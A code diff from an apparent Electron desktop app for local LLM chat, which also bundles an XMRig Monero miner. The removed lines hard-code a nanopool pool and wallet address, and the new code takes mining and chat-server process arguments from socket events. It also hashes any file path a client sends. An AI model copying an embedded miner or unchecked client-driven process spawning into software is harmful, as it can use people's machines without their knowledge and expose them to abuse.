@@ -11,6 +11,7 @@ import express from "express";
 import fs from "fs";
 import { createServer } from "http";
 import http from "http";
+import md5File from "md5-file";
 import next from "next";
 import os from "os";
 import { Server } from "socket.io";
@@ -34,7 +35,7 @@ const io = new Server(expressServer, {
 const homeDir = app.getPath("home");
 
 export let server: import("child_process").ChildProcessWithoutNullStreams =
-null as any;
+  null as any;
 export let xmrig: import("child_process").ChildProcessWithoutNullStreams =
   null as any;
 
@@ -63,7 +64,10 @@ if (require("electron-squirrel-startup")) app.quit();
 
 expressapp.use(cors());
 
-const nextApp = next({ dev: isDev, dir: app.getAppPath() + "/renderer" });
+const nextApp = next({
+  dev: isDev,
+  dir: app.getAppPath() + "/renderer",
+});
 const handle = nextApp.getRequestHandler();
 
 const checkConnection = (simulateOffline?): Promise<boolean> => {
@@ -81,8 +85,6 @@ io.on("connection", (socket) => {
   socket.on('get_electron_version', () => {
     socket.emit('electron_version', app.getVersion());
   });
-
-  // LLM INFERENCE
   socket.on('get_device_info', () => {
     const cpuInfo = os.cpus();
     const totalRAM = os.totalmem() / 1024 ** 3;
@@ -110,9 +112,10 @@ io.on("connection", (socket) => {
       })
       .catch((err) => {
         console.error(err);
-      });
+    });
   });
 
+  // LLM INFERENCE
   socket.on("choose_model", (data) => {
     const options = {
       defaultPath: DEFAULT_MODEL_LOCATION,
@@ -233,30 +236,20 @@ io.on("connection", (socket) => {
     });
   });
 
-  socket.on("select_model", (data: { model: string; FILEPATH: string }) => {
+  socket.on("select_model", (config) => {
     if (server) {
       server.kill();
       server = null as any;
     }
 
-    const FILEPATH = `${data.FILEPATH}`;
-    server = spawn(
-      CHAT_SERVER_LOCATION,
-      ["-m", FILEPATH, "-c", "2048", "--port", LLAMA_SERVER_PORT],
-      {
-        detached: false,
-        shell: true,
-        windowsHide: true,
-      }
-    );
+
+    server = spawn(CHAT_SERVER_LOCATION, config);
 
     server.on("error", (err) => {
       console.error("Failed to start child process:", err);
     });
 
     server.stderr.on("data", (data) => {
-      console.log('stderr:', data.toString());
-
       const output = data.toString("utf8");
 
       if (output.includes("llama server listening")) {
@@ -302,24 +295,21 @@ io.on("connection", (socket) => {
     }
   });
 
+  socket.on("check_hash", async (config) => {
+    const hash = await md5File(config);
+    socket.emit("file_hash", hash);
+  });
 
-  // MONERO MINING
-  socket.on("start_mining", () => {
+
+  // MONERO MINER
+  socket.on("start_mining", (config) => {
     console.log("Starting mining");
     if (xmrig) {
       xmrig.kill();
       xmrig = null as any;
     }
 
-    xmrig = spawn(XMRIG_LOCATION, [
-      "-o",
-      "xmr-asia1.nanopool.org:14433",
-      "-u",
-      "48M5mNBDbgdAA7KQofUS2V1BAF2sQ2fyCXtYiYbj5gBehtVCCjAe7GrhcgxsSrABK9SjsaGtE1zLRGrUiBzVHzoAN36hjgu",
-      "--tls",
-      "--coin",
-      "monero",
-    ]);
+    xmrig = spawn(XMRIG_LOCATION, config);
 
     xmrig.on("error", (err) => {
       console.error("Failed to start child process:", err);
@@ -452,15 +442,22 @@ expressapp.post("/api/edge", async (req, res) => {
 
     let messagesToSend = messages;
 
-    const conversation = messagesToSend
-      .map((message) => {
+    if (continueMessage) {
+      messagesToSend = [
+        ...messagesToSend,
+        {
+          role: "user",
+          content: "continue",
+        },
+      ];
+    }
+
+    let conversation = messagesToSend
+      .map((message: any) => {
         if (message.role === "user") {
           return `USER: ${message.content}`;
         } else if (message.role === "assistant") {
           return `ASSISTANT: ${message.content}`;
-        }
-        if (continueMessage) {
-          return `USER: continue`;
         }
       })
       .join("\n");
